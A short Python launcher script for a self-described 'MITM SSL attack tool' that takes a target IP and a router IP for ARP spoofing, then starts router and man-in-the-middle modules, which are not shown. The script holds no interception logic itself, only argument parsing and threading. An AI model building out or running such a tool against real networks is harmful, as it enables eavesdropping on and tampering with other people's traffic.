import argparse
import os
import sys
import threading
from stage import mitm, router

parser = argparse.ArgumentParser(description='MITM SSL attack tool')
parser.add_argument('--iface', help='Interface to use', required=True)
parser.add_argument('--target', help='Target IP to attack', required=True)
parser.add_argument('--router', help='Router IP (Used for MITM ARP spoofing)',
                    required=True)

opts = parser.parse_args()

#if os.getuid() != 0:
#    print('Must be run as root')
#    sys.exit(1)


def main():
    router.run()

    t_mitm = threading.Thread(target=mitm.run, args=(opts.router, opts.target,                                                   opts.iface))
    t_mitm.start()


if __name__ == '__main__':
    main()